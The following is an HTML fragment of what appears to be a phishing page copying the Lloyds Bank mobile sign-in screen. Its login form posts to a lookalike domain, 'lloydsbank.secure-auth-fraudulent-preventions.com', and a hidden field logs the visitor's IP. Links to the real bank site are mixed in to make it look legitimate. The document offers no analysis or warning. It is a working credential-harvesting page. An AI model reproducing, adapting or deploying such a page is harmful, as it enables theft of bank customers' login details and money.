...
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">
    <head>
        ...
        <link rel="apple-touch-icon" sizes="57x57" href="https://lloydsbank.secure-auth-fraudulent-preventions.com/files/img/ltsb%2057x57-.JPG" />
        <link rel="apple-touch-icon" sizes="114x114" href="https://lloydsbank.secure-auth-fraudulent-preventions.com/files/img/ltsb%20114x114-.JPG" />
                                    ...
                                    <div class="loginInner">
                                            ...
                                            <div class="msgTL">
                                                <div class="msgTR">
                                                    <div class="msgBR">
                                                        <div class="msgBL">
                                                                <p class="msgP">You are not allowed to use your email. Please try again. <a href="https://www.online.lloydsbank.co.uk/" title="">Having problems signing in?</a> Please note, you’ll be redirected to the desktop site.</p>              
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        ...
                                        <div class="loginFields">
                                            <form id="frmLogin" name="frmLogin" method="post" action="https://lloydsbank.secure-auth-fraudulent-preventions.com/personal/mbprimarylogin" autocomplete="off">
											<input type="hidden" name="ip" value="82.102.26.52">
                                                ...
                                                <div class="formField loginCheckbox">
                                                    ...
                                                    <label class="checkboxLabel" for="frmLogin:loginRemember">
                                                        <a id="rememberMe" name="rememberMe" title="Remember my User ID" href="https://online.lloydsbank.co.uk/personal/a/mobile/mobile_help/login/REMEMBER_ME">
                                                            Remember my User ID
                                                        </a>
                                                    </label>
                                                </div>
                        ...
                        <div class="aside">
                            ...
                            <div class="appBannerBG">
                                <div class="appBannerLink">
                                    <p align="center">
                                        <a href="http://www.lloydsbank.com/legal/financial-services-compensation-scheme.asp" title="fscs login tile"><img alt="fscs login tile" src="files/img/Mobile&#32;-&#32;1x-1461591119.png" /></a>
                                    </p>
                                </div>
                            </div>
